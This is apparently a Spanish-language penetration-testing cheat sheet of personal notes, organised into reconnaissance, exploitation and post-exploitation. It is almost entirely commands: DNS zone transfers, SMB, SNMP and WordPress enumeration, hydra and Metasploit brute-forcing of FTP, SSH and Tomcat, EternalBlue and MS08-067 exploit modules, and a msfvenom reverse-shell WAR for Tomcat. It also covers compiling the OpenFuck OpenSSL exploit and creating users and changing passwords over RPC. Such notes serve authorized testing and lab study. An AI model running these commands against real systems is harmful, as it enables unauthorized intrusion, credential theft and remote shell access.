Obtención de info

whois (información general)

site:WEB filetype:cfg
mysql dump filetype:sql

/?-s // Para mostrar el código fuente en php
cutycapt --url=URL --out=captura.png [--insecure] // Hace una captura de pantalla de la web especificada

Crear diccionarios
	cewl -w DICC-OUTPUT.txt --with-numbers -a -e URL

Crawling de emails
	theharvester -d URL -b all > mail.txt (-d usa todos los motores de búsqueda)
	SIMPLYEMAIL
		git clone https://github.com/killswitch-GUI/SimplyEmail.git
		pip install fake_useragent
		pip install BeautifulSoup
		pip install docx2txt
		python SimplyEmail.py -all -e URL
Metadatos de documentos
	metagoofil -d [url] -t [tipo de documento] -l [límite] -n [intentos] -o [archivo de salida] -f [archivo html que genera el programa]

DNS
	nslookup
		set type=mx (para obtener servidores de correo corporativos)
	DNS Zone Transfers
		host -t ns [url] // Para obtener el nameserver
		host -l [url] [nameserver] // Para intentar hacer el zone transfer y que muestre toda la lista de resoluciones DNS
	dnsrecon -d URL -t axfr
	dnsenum URL
	dig a/mx/axfr domain-name-here.com @nameserver

	***************************************************************************************************************
	// script.sh URL
		for server in $(host -t ns $1 | cut -d " " -f 4); do
		host -l $1 $server | grep "has address"
		done
    ***************************************************************************************************************

Enum directorios
	gobuster -w WORDLIST -u URL -t 50 [-x php,txt,html,htm] [-k] (para saltar comprobación SSL) dir
	wfuzz --hc 404 -w /usr/share/wordlists/dirb/common.txt [IP]
	dirb URL DICC
	dirb URL -z 100 (Delay ms) (no hace falta diccionario)
	dirb URL -p IP:PUERTO // Usar un proxy
	uniscan -u URL -qweds

SMB
	use auxiliary/scanner/smb/smb_version
	enum4linux -a IP
	nbtscan -r RED
	smbclient -L //IP // Ya lo hace enum4linux. Lista recursos compartidos en la máquina con null session
	smbclient -U [username] -L [IP target] // Ya lo hace enum4linux
	smbclient -W DOMAIN -U USER \\\\COMPUTER_NAME\\NETLOGON
	smb-enum-shares.nse -p445
	nbstat.nse -p 137 // Netbios expuestos
	smb-os-discovery.nse
	smb-enum-users.nse -p U:137,T:139

FTP
	use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima mediante ftp)
		definir RHOSTS (targets)

RPC
	rpcinfo -p IP [apt-get install nfs-common]
	rpcclient -U ""/"USERNAME" --command=enumprivs -N IP // Enumerar privilegios
	rpcclient -U "" (Y después ir probando entre las comillas posibles usernames) IP
		Probamos con contraseñas vacías
	nmap --script msrpc-enum IP

NFS
	nmap -sV --script=nfs-showmount IP
	showmount -e IP
	mount IP:/directorio /mnt

TELNET
	use auxiliary/scanner/telnet/telnet_version

MYSQL
	use auxiliary/admin/mysql/mysql_enum
	
MSSQL
	nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER IP

VNC
	use auxiliary/scanner/vnc/vnc_none_auth

SMTP
	nc -v [ip] 25
	VRFY [usuario] Para comprobar si ese usuario existe y su email
	HELO asdf // Devuelve el nombre de dominio
	smtp-commands.nse

SSH
	use auxiliary/scanner/ssh/ssh_enumusers

SNMP
	DEFAULT PASS
	/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
	
	snmpwalk -c public IP 1.3.6.1.4.1.77.1.2.25 // Windows Users
	snmpwalk -c public IP 1.3.6.1.2.1.25.4.2.1.2 // Windows Processes
	snmpwalk -c public IP 1.3.6.1.2.1.6.13.1.3 // Open TCP Ports
	snmpwalk -c public IP 1.3.6.1.2.1.25.6.3.1.2 // Installed Software
  	snmpwalk -v 1(o la que sea) -c public(community name de snmp_login) IP

	snmpcheck -t IP -c public // Enumeración
	snmpenum -t IP
	onesixtyone -c NAMES -i HOSTS
	
	auxiliary/scanner/snmp/snmp_login
	auxiliary/scanner/snmp/snmp_enum

Wordpress
	/wp-json/wp/v2/users
	wpscan 	NO ADMITE SITIOS .WORDPRESS.COM
	--url [url] --enumerate p (plugins)
	en vez de p, vp para plugins vulnerables
	vt para temas vulnerables
	u enumera usernames

Magento
	wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
	php magescan.phar scan:all URL

CMS
	https://github.com/FlorianHeigl/cms-explorer
	https://github.com/Tuhinshubhra/CMSeeK



#################################################################################################
#################################################################################################
#################################################################################################

Explotación

FTP
	hydra -L USERS.txt -P PASS.txt -vV IP ftp
	use auxiliary/scanner/ftp/ftp_login
	set user_file /usr/share/metasploit-framework/data/wordlists/unix_users.txt
	touch /usr/share/metasploit-framework/data/wordlists/blank.txt
	set pass_file /usr/share/metasploit-framework/data/wordlists/blank.txt
	set user_as_pass true
  	set BRUTEFORCE_SPEED 1

TOMCAT
	use auxiliary/admin/http/tomcat_administration // Probar creds de admin
	set BLANK_PASSWORDS true
	set USER_AS_PASS true
	use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
	set BLANK_PASSWORDS true
	set USER_AS_PASS true

SMB
	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
  	put [archivo] (sube el archivo al directorio del ordenador víctima)
  	use exploit/multi/samba/usermap_script
  	Samba 3.0.
  		use auxiliary/scanner/smb/smb_ms17_010
		Si es vulnerable
			use exploit/windows/smb/ms17_010_eternalblue
  	Para WinXP =>
	smb-vuln-ms08-067.nse
	use auxiliary/scanner/smb/ms08_067_check
	use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
	payload windows/vncinject/bind_tcp

POP3
	telnet IP 110
	USER usuario
	PASS password
	list
	retr NUMERO

SSH
	hydra -L USERS.txt -P PASS.txt -vV IP ssh

#################################################################################################
#################################################################################################
#################################################################################################

Post Explotación

RPC
	Si entramos, con srvinfo obtenemos info sobre el sistema
	Con querydominfo obtenemos más info
	Con enumdomusers enumeramos los usuarios del sistema
		cat salida.txt | cut -d "[" -f 2 | cut -d "]" -f 1 | sort -u > usersRPC.txt
	Con createdomuser [nombre] si tenemos privilegios creamos un usuario
	Con getdompwinfo vemos la complejidad mínima para las contraseñas
	Con chgpasswd2 [username] [old pass] [new pass] cambiamos la contraseña
	Con lsaquery (en teoría) obtenemos el nombre de dominio

TOMCAT
	En caso de que accedamos al manager => msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
	O también => use exploit/multi/http/tomcat_mgr_deploy
	
OPENSSL
	OpenFuck => https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
	gcc -o OpenFuck /usr/share/exploitdb/exploits/unix/remote/764.c -lcrypto
